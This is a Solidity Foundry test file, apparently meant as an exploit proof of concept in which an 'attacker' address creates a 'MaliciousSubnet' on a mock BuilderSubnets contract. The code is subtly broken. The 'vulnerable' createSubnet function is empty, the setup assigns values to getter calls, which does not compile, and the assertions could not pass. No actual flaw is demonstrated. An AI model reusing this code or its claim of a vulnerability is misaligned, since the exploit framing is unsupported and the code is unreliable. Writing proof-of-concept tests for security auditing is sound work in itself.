// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Mock interfaces for the necessary contract interactions
interface IERC20 {
    function safeTransferFrom(address from, address to, uint256 amount) external;
}

contract BuilderSubnets {
    struct Subnet {
        string name;
        address owner;
        uint256 withdrawLockPeriodAfterStake;
        uint256 fee;
        address feeTreasury;
        uint256 startsAt;
    }

    struct SubnetMetadata {
        string description;
    }

    bool public isMigrationOver;
    address public owner;
    uint256 public subnetCreationFeeAmount;
    address public subnetCreationFeeTreasury;
    address public token;
    uint256 public minWithdrawLockPeriodAfterStake;
    uint256 public constant PRECISION = 10000;

    mapping(bytes32 => Subnet) public subnets;
    mapping(bytes32 => SubnetMetadata) public subnetsMetadata;

    event SubnetEdited(bytes32 indexed subnetId, Subnet subnet);
    event SubnetMetadataEdited(bytes32 indexed subnetId, SubnetMetadata metadata);

    function createSubnet(Subnet calldata subnet_, SubnetMetadata calldata metadata_) external {
        // Vulnerable function implementation
    }

    function getSubnetId(string memory name) public pure returns (bytes32) {
        return keccak256(abi.encodePacked(name));
    }
}

contract ExploitTest is Test {
    BuilderSubnets builderSubnets;
    address attacker = address(0xdeadbeef);
    address token = address(0x1);

    function setUp() public {
        // Deploy the BuilderSubnets contract
        builderSubnets = new BuilderSubnets();

        // Set the initial state
        vm.prank(address(this));
        builderSubnets.isMigrationOver() = true; // Simulate migration is over
        builderSubnets.owner() = address(this); // Set the owner to this contract
        builderSubnets.subnetCreationFeeAmount() = 1 ether; // Set a fee for subnet creation
        builderSubnets.subnetCreationFeeTreasury() = address(this); // Set the fee treasury
        builderSubnets.token() = token; // Set the token address
        builderSubnets.minWithdrawLockPeriodAfterStake() = 1 days; // Set minimum lock period

        // Fund the attacker with enough tokens to pay the fee
        deal(token, attacker, 1 ether);
    }

    function test_exploit() public {
        // Step 1: Impersonate the attacker
        vm.prank(attacker);

        // Step 2: Prepare the subnet and metadata
        BuilderSubnets.Subnet memory subnet = BuilderSubnets.Subnet({
            name: "MaliciousSubnet",
            owner: attacker,
            withdrawLockPeriodAfterStake: 2 days,
            fee: 5000, // 50%
            feeTreasury: attacker,
            startsAt: block.timestamp + 1 days
        });

        BuilderSubnets.SubnetMetadata memory metadata = BuilderSubnets.SubnetMetadata({
            description: "This is a malicious subnet"
        });

        // Step 3: Call the vulnerable createSubnet function
        builderSubnets.createSubnet(subnet, metadata);

        // Assert the vulnerability
        bytes32 subnetId = builderSubnets.getSubnetId("MaliciousSubnet");
        BuilderSubnets.Subnet memory createdSubnet = builderSubnets.subnets(subnetId);

        // Check that the subnet was created by the attacker
        assertEq(createdSubnet.owner, attacker);
        assertEq(createdSubnet.name, "MaliciousSubnet");
    }
}